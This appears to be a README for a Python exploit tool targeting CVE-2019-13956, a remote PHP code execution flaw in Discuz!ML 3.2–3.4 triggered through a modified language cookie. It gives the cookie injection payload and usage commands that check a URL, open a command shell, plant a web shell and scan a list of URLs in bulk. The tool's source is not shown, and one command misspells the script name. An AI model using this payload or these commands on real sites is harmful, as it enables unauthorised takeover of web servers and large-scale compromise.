**Discuz ML RCE** <br/>
CVE ID : CVE-2019-13956
<br/>
**URL: https://www.esoln.net/blog/2019/06/14/discuzml-v-3-x-code-injection-vulnerability/**
<br/>
**CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2019-13956**
<br/>
**CVE Mitre** : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13956


----------------
<br/>

Discuz!ML 3.2 through 3.4 allows remote attackers to execute arbitrary PHP code via a modified language cookie, as demonstrated by changing 4gH4_0df5_language=en to 4gH4_0df5_language=en'.phpinfo().'; (if the random prefix 4gH4_0df5_ were used). 


<br/>


----------------
**Installation** 

<br/>
python2.7<br/>
pip -r requirements.txt
<br/><br/>



----------------
**Help**

`python discuz_mlRce.py -h`<br/>



----------------
**Vulnerability Detection** 

`python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" `<br/>

------
**GETTING Command Shell**

`python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" --cmdshell`

----------------

**GETTING Shell URL**

`python ddiscuz_mlRce.py -u "http://www.ppp.cn/forum.php" --getshell`

----------------

**Scanning List of URL** 

`python discuz_mlRce.py -f urls.txt`

----------
